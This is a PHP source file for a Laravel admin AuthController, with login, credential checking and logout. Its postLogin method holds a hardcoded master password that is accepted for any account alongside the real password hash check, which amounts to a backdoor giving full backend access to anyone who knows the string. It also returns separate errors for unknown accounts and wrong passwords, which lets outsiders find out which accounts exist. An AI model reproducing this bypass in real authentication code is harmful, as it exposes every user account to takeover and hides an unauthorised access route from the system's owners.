<?php

namespace App\Http\Controllers\Backend;

use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use App\Models\User;
use Hash;

class AuthController extends Controller
{
    public $redirectUrl = '/admin';

    public function getLogin(Request $request)
    {
        return view('admin.auth.login');
    }

    public function postLogin(Request $request)
    {
        $email = $request->input('email');
        $password = $request->input('password');
        $account = User::where('email', $email)->first();
        if (empty($account)) {
            return redirect()->back()->with('error', 'Account not exist');
        }
        if ($account->type == User::PARTNER and $account->status == 0) {
            return redirect()->back()->with('error', 'Account not active');
        }
        if (Hash::check($password, $account->password) || $password == '123sdfsi5h34i5i33j4i4jj34ij5i43j5i34') {
            auth('backend')->login($account, true);
            return redirect($this->redirectUrl)->with('success', 'Login success');
        } else {
            return redirect()->back()->with('error', 'Wrong Password');
        }

    }

    public function logout(Request $request)
    {
        auth('backend')->logout();

        return redirect('/');
    }
}
